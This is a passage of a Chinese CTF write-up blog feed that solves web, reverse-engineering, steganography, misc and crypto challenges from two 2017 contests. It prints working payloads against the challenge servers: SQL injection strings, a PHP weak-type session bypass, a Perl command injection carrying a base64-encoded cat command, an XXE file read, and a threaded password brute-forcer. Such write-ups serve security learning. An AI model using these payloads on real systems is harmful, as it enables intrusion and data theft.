class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>,<span class="string">"admin@admin.com"</span>);</div><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> fuckbean.* <span class="keyword">to</span> fuckbean@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'fuckbean'</span>;</div></pre></td></tr></table></figure></p>
<p>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a&apos;union select 1,2,3,0xxxxxxx-- a@qq.com</div></pre></td></tr></table></figure></p>
<p>其中<code>0xxxxxxx</code>是你自己的邮箱的hex，提交后收到flag邮件</p>
<h2 id="babylogin"><a href="#babylogin" class="headerlink" title="babylogin"></a>babylogin</h2><p>题目给了源代码，关键语句如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key) &#123;</div><div class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $key2 =&gt; $value) &#123;</div><div class="line">        $_GPC[$key2]=$value;</div><div class="line">    &#125;</div><div class="line">...</div><div class="line">...</div><div class="line"></div><div class="line">$session = json_decode(base64_decode($_GPC[<span class="string">'__session'</span>]), <span class="keyword">true</span>);</div><div class="line">    <span class="keyword">if</span> (is_array($session))&#123;</div><div class="line">        $user = find_user_by_uid($session[<span class="string">'uid'</span>]);</div><div class="line">        <span class="keyword">if</span>(is_array($user) &amp;&amp; $session[<span class="string">'hash'</span>] == $user[<span class="string">'password'</span>])&#123;</div><div class="line">            $_SESSION[<span class="string">"login"</span>]=<span class="number">1</span>;</div><div class="line">            $_SESSION[<span class="string">"userin"</span>]=$userin;</div><div class="line">            header(<span class="string">"Location: admin.php"</span>);</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看出<code>session</code>可控，而且存在<code>==</code>弱类型,<code>True==&quot;xxxxxxx&quot;</code> 恒成立<br>用如下代码构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$session[<span class="string">'uid'</span>]=<span class="number">1</span>;</div><div class="line">$session[<span class="string">'hash'</span>]=<span class="keyword">True</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(json_encode($session));</div></pre></td></tr></table></figure></p>
<p>最后抓登陆的包，加一个参数<code>__session</code>值为<code>eyJ1aWQiOjEsImhhc2giOnRydWV9</code>就能跳转到<code>admin.php</code></p>
<h2 id="php的锅"><a href="#php的锅" class="headerlink" title="php的锅"></a>php的锅</h2><p>改天写好了</p>
<h1 id="秋季预赛"><a href="#秋季预赛" class="headerlink" title="秋季预赛"></a>秋季预赛</h1><h2 id="都是php就不好玩了呀"><a href="#都是php就不好玩了呀" class="headerlink" title="都是php就不好玩了呀"></a>都是php就不好玩了呀</h2><p>题目地址： <a href="http://118.178.18.181:57016/index.pl?file=test.txt" target="_blank" rel="noopener">http://118.178.18.181:57016/index.pl?file=test.txt</a><br>perl写的，直接读取<code>index.pl</code>就能拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:57016/index.pl?file=index.pl</div></pre></td></tr></table></figure></p>
<h2 id="查询ip"><a href="#查询ip" class="headerlink" title="查询ip"></a>查询ip</h2><p>夏季预赛的题，直接nslookup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">C:\Users\xxxxxx&gt;nslookup 107.182.177.34</div><div class="line">服务器:  UnKnown</div><div class="line">Address:  172.16.0.1</div><div class="line"></div><div class="line">名称:    this-is-flag</div><div class="line">Address:  107.182.177.34</div></pre></td></tr></table></figure></p>
<h2 id="mac就是好用"><a href="#mac就是好用" class="headerlink" title="mac就是好用"></a>mac就是好用</h2><p>题目地址： <a href="http://118.178.18.181:57013/" target="_blank" rel="noopener">http://118.178.18.181:57013/</a><br>下载<code>http://118.178.18.181:57013/.DS_store</code>,cat一下，发现<code>s h o w m e f l a g . p h p</code>字样<br>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:57013/showmeflag.php</div></pre></td></tr></table></figure></p>
<p>拿到flag</p>
<h2 id="人，才是最大的漏洞"><a href="#人，才是最大的漏洞" class="headerlink" title="人，才是最大的漏洞"></a>人，才是最大的漏洞</h2><p>题目地址： <a href="http://114.55.36.69:57012/" target="_blank" rel="noopener">http://114.55.36.69:57012/</a><br>经典登录框注入，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username=1&apos;union select md5(1)#</div><div class="line">password=1</div></pre></td></tr></table></figure></p>
<p>拿到flag</p>
<h2 id="sqlmap没有卵用"><a href="#sqlmap没有卵用" class="headerlink" title="sqlmap没有卵用"></a>sqlmap没有卵用</h2><p>题目地址： <a href="http://118.178.18.181:57019/" target="_blank" rel="noopener">http://118.178.18.181:57019/</a><br>右键源代码提示<code>source.php</code>,union和from前面只能存在字母，不能有空格，构造<code>\N</code>绕过，(我也不知道为啥只有<code>\N</code>可以，小写n的不行)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">\Nunion <span class="keyword">select</span> <span class="number">1</span>,flag, \Nfrom flag%<span class="number">23</span> </div><div class="line"> // \N表示回车，在Linux中表示一行的结束。</div></pre></td></tr></table></figure></p>
<h2 id="都是php就不好玩了呀-1"><a href="#都是php就不好玩了呀-1" class="headerlink" title="都是php就不好玩了呀"></a>都是php就不好玩了呀</h2><p>题目地址： <a href="http://118.178.18.181:57016/index.pl?file=test.txt" target="_blank" rel="noopener">http://118.178.18.181:57016/index.pl?file=test.txt</a><br>构造代码注入，这里要把含有flag的用base64编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:57016/index.pl?file=test.txt| `echo Y2F0IC92YXIvd3d3L2h0bWwvZmxhZy5wbA==| base64 -d`|</div></pre></td></tr></table></figure></p>
<h2 id="can-u-read-me-do-u-understand-me"><a href="#can-u-read-me-do-u-understand-me" class="headerlink" title="can u read me,do u understand me?"></a>can u read me,do u understand me?</h2><p>题目地址： <a href="http://114.55.36.69:57018/" target="_blank" rel="noopener">http://114.55.36.69:57018/</a><br>XXE,直接读取flag.php，读取出来的源码是phpjiami过的，可以去花钱解也可以直接用工具解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE xdsec[</div><div class="line">&lt;!ELEMENT methodname ANY&gt;</div><div class="line">&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;</div><div class="line">&lt;user&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/user&gt;</div></pre></td></tr></table></figure></p>
<h2 id="还记得找回密码的功能嘛"><a href="#还记得找回密码的功能嘛" class="headerlink" title="还记得找回密码的功能嘛"></a>还记得找回密码的功能嘛</h2><p>题目地址： <a href="http://114.55.36.69:57014/" target="_blank" rel="noopener">http://114.55.36.69:57014/</a><br>给了源码<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;union select 1,2,3,4 -- yourqq@qq.com</div></pre></td></tr></table></figure></p>
<p>这里主要是利用了空格会被分割成多个收件人</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实就是慕测安恒杯&lt;br&gt;6月18日的夏季预赛线上赛，9月22日更新babysql，10月12日更新findpwd、服务发现、babylogin&lt;br&gt;10月23更新秋季预赛题目&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="文件包含" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="编辑器泄露" scheme="https://www.codemonster.cn/tags/%E7%BC%96%E8%BE%91%E5%99%A8%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>2017 世安杯线上预赛 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/10/2017-shianbei-ctf-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/10/2017-shianbei-ctf-writeup/</id>
    <published>2017-10-10T06:41:39.000Z</published>
    <updated>2018-05-04T07:47:50.013Z</updated>
    
    <content type="html"><![CDATA[<p>emmmmmmmm，关于比赛质量问题，出门左转<a href="https://www.zhihu.com/question/66360616" target="_blank" rel="noopener">知乎</a>，出门右转<a href="https://ctfrank.org/events/39" target="_blank" rel="noopener">ctfrank</a><br>昨天竟然接到了决赛通知电话，考虑到各种问题，最后还是弃权了<br>以下是线上赛wp<br><a id="more"></a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ctf入门级题目"><a href="#ctf入门级题目" class="headerlink" title="ctf入门级题目"></a>ctf入门级题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-rao/</div></pre></td></tr></table></figure>
<p>题目给了源代码<code>index.phps</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">'*********'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;section class="login"&gt;</div><div class="line">        &lt;div class="title"&gt;</div><div class="line">                &lt;a href=<span class="string">"./index.phps"</span>&gt;View Source&lt;/a&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">        &lt;form method=<span class="string">"POST"</span>&gt;</div><div class="line">                &lt;input type=<span class="string">"text"</span> required name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> /&gt;&lt;br/&gt;</div><div class="line">                &lt;input type=<span class="string">"submit"</span>/&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">&lt;/section&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>利用<code>%00</code>可以截断<code>ereg</code>，构造<code>?password=1%00—</code><br><code>flag{Maybe_using_rexpexp_wasnt_a_clever_move}</code></p>
<h2 id="曲奇"><a href="#曲奇" class="headerlink" title="曲奇"></a>曲奇</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&amp;file=a2V5LnR4dA==</div></pre></td></tr></table></figure>
<p>file参数后面是<code>base64编码</code>的<code>key.txt</code>，line是行数<br>编写py脚本读取<code>index.php</code>源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by:xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"></div><div class="line">r1=r.session()</div><div class="line">url=<span class="string">'http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&#123;0&#125;&amp;file=aW5kZXgucGhw'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">	r2=r1.get(url.format(str(i)))</div><div class="line">	<span class="keyword">print</span> r</div></pre></td></tr></table></figure></p>
<p>读取到的index.php如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">""</span>);</div><div class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;file=a2V5LnR4dA=="</span>);</div><div class="line"></div><div class="line">$file_list = <span class="keyword">array</span>(</div><div class="line"><span class="string">'0'</span> =&gt;<span class="string">'key.txt'</span>,</div><div class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</div><div class="line">);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>]==<span class="string">'li_lr_480'</span>)&#123;</div><div class="line">$file_list[<span class="number">2</span>]=<span class="string">'thisis_flag.php'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</div><div class="line">$fa = file($file);</div><div class="line"><span class="keyword">echo</span> $fa[$line];</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>可以看到当cookie中的<code>key</code>值为<code>li_lr_480</code>，即可读取<code>thisis_flag.php</code>文件<br><img src="/img/2017-sab-web2.png" alt=""><br><code>flag{UHGgd3rfH*(3HFhuiEIWF}</code></p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-leixing/</div></pre></td></tr></table></figure>
<p>经典弱类型题，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-leixing/?x1=0&amp;x2=&#123;&apos;x21&apos;:&apos;2018a&apos;,&apos;x22&apos;:[[1],0]&#125;&amp;x3=XIPU-=3CS</div></pre></td></tr></table></figure></p>
<p>其中<code>XIPU-=3CS</code>md5加密后的8到16位以0e开头，其他全是数字<br>下面是跑md5脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">b=<span class="string">'-=[],./;"1234567890abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(str1)</span>:</span></div><div class="line">    <span class="keyword">if</span> hashlib.md5(str1).hexdigest()[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>:</div><div class="line">        flag=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hashlib.md5(str1).hexdigest()[<span class="number">10</span>:<span class="number">24</span>]:</div><div class="line">            <span class="keyword">if</span> i&gt;<span class="string">'9'</span>:</div><div class="line">                flag=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> flag==<span class="number">0</span>:</div><div class="line">            <span class="keyword">print</span> str1</div><div class="line">            input(<span class="string">"success"</span>)</div><div class="line">    <span class="keyword">if</span>(len(str1)&gt;<span class="number">8</span>):</div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> b:</div><div class="line">            find(str1+i)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    find(<span class="string">'XIPU'</span>)</div></pre></td></tr></table></figure></p>
<p><code>CTF{Php_1s_bstl4_1a}</code></p>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-s/</div></pre></td></tr></table></figure>
<p>提示密码<code>5位数字</code>，跑密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by:xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"></div><div class="line">url=<span class="string">'http://ctf1.shiyanbar.com/shian-s/index.php'</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, arg)</span>:</span></div><div class="line">		super(MyThread, self).__init__()</div><div class="line">		self.arg = arg</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">for</span> site <span class="keyword">in</span> self.arg:</div><div class="line">			scan(site)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">    	r1=r.session()</div><div class="line">        r3=r1.get(url)</div><div class="line">        ss=re.findall(<span class="string">r'type="text"&gt;&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;'</span>,r3.text)</div><div class="line">        url1=url+<span class="string">'?username=admin&amp;password='</span>+i+<span class="string">'&amp;randcode='</span>+ss[<span class="number">0</span>]</div><div class="line">        r2=r1.get(url1)</div><div class="line">        r2.encoding = <span class="string">'utf-8'</span></div><div class="line">        <span class="comment">#print r2.text</span></div><div class="line">        <span class="keyword">if</span> len(r2.text)!=<span class="number">146</span>:</div><div class="line">        	<span class="keyword">print</span> r2.text,url1</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	thread_num=<span class="number">100</span></div><div class="line">	site = [[] * <span class="number">1005</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_num)]</div><div class="line">	threads = []</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">		j = i % thread_num</div><div class="line">		s = <span class="string">'%05d'</span> % i</div><div class="line">		site[j].append(s)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> site:</div><div class="line">		t = MyThread(i)</div><div class="line">		threads.append(t)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> threads:</div><div class="line">		i.setDaemon(<span class="keyword">True</span>)</div><div class="line">		i.start()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> threads: </div><div class="line">		i.join()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>跑出来密码为<code>00325</code><br><code>flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}</code></p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-du/</div></pre></td></tr></table></figure>
<p><code>php伪协议php://input</code>通过第一个if<br>再利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-du/?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>读取index.php和class.php源码<br>提示flag在<code>f1a9.php</code>中，f1a9被过滤了，于是构造<code>反序列化</code>字符串读取flag，听说大佬们用这个直接读取了其他web题的flag，膜<br><img src="/img/2017-sab-web5.png" alt=""><br><code>flag_Xd{hSh_ctf:e@syt0g3t}</code> </p>
<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h2><p>PEID查出来是<code>C#</code>写的，ILSpy反编译得到源码<br><img src="/img/2017-sab-re1.png" alt=""><br>将代码取出来编译运行，输出string b得到flag<br><code>flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></p>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>参考：<br><a href="https://ctf.rip/bsides-sf-ctf-2017-flag-receiver-mobile-reverse-engineering/" target="_blank" rel="noopener">https://ctf.rip/bsides-sf-ctf-2017-flag-receiver-mobile-reverse-engineering/</a><br><code>TheseIntentsAreFunAndEasyToUse</code></p>
<h2 id="简单算法"><a href="#简单算法" class="headerlink" title="简单算法"></a>简单算法</h2><p>队友做的</p>
<h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>把bmp保存为<code>png</code>，Stegsolve.jar打开，扫描二维码<br><img src="/img/2017-sab-ste1.png" alt=""><br><code>flag{139711e8e9ed545e}</code></p>
<h2 id="斑马斑马"><a href="#斑马斑马" class="headerlink" title="斑马斑马"></a>斑马斑马</h2><p>用ps处理，提取出<code>条形码</code>部分，用qq扫描得到flag<br><img src="/img/2017-sab-ste2.png" alt=""><br><code>Tenshine</code></p>
<h2 id="CreateByWho"><a href="#CreateByWho" class="headerlink" title="CreateByWho"></a>CreateByWho</h2><p>拼二维码，需要补<code>三块回型</code>的块<br><img src="/img/2017-sab-ste3.png" alt=""><br><code>Create-By-SimpleLab</code></p>
<h2 id="适合作为桌面的图片"><a href="#适合作为桌面的图片" class="headerlink" title="适合作为桌面的图片"></a>适合作为桌面的图片</h2><p>Stegsolve.jar打开，扫二维码，保存为<code>pyc</code>，<code>反编译</code>后运行得到flag<br><img src="/img/2017-sab-ste4.png" alt=""><br><code>flag{38a57032085441e7}</code></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>winhex打开后在尾部发现<code>photoshop</code>字样，不过是倒序的，写个py脚本倒序保存得到图片，再用ps处理得到flag<br><img src="/img/2017-sab-misc1.png" alt=""><br><code>flag{4f7548f93c7bef1dc6a0542cf04e796e}</code></p>
<h2 id="珍妮的qq号"><a href="#珍妮的qq号" class="headerlink" title="珍妮的qq号"></a>珍妮的qq号</h2><p>数学题，也可以写个py跑一下就出来了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by:xishir</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">100000</span>):</div><div class="line">	j=i*<span class="number">4</span></div><div class="line">	<span class="keyword">if</span> j&lt;<span class="number">100000</span>:</div><div class="line">		si=str(i)</div><div class="line">		sj=str(j)</div><div class="line">		<span class="keyword">if</span> si[<span class="number">0</span>]==sj[<span class="number">4</span>] <span class="keyword">and</span> si[<span class="number">1</span>]==sj[<span class="number">3</span>] <span class="keyword">and</span> si[<span class="number">2</span>]==sj[<span class="number">2</span>] <span class="keyword">and</span> si[<span class="number">3</span>]==sj[<span class="number">1</span>] <span class="keyword">and</span> si[<span class="number">4</span>]==sj[<span class="number">0</span>]:</div><div class="line">			<span class="keyword">print</span> j</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<h2 id="心仪的公司"><a href="#心仪的公司" class="headerlink" title="心仪的公司"></a>心仪的公司</h2><p>wireshark打开，追踪http流找到flag<br><img src="/img/2017-sab-misc3.png" alt=""><br><code>fl4g:{ftop_Is_Waiting_4_y}</code></p>
<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">c= <span class="number">2044619806634581710230401748541393297937319</span> </div><div class="line">n= <span class="number">92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> libnum</div><div class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">10</span>):</div><div class="line">    m = libnum.nroot(c,e)</div><div class="line">    <span class="keyword">if</span> m**e==c:</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"e:"</span>,e</div><div 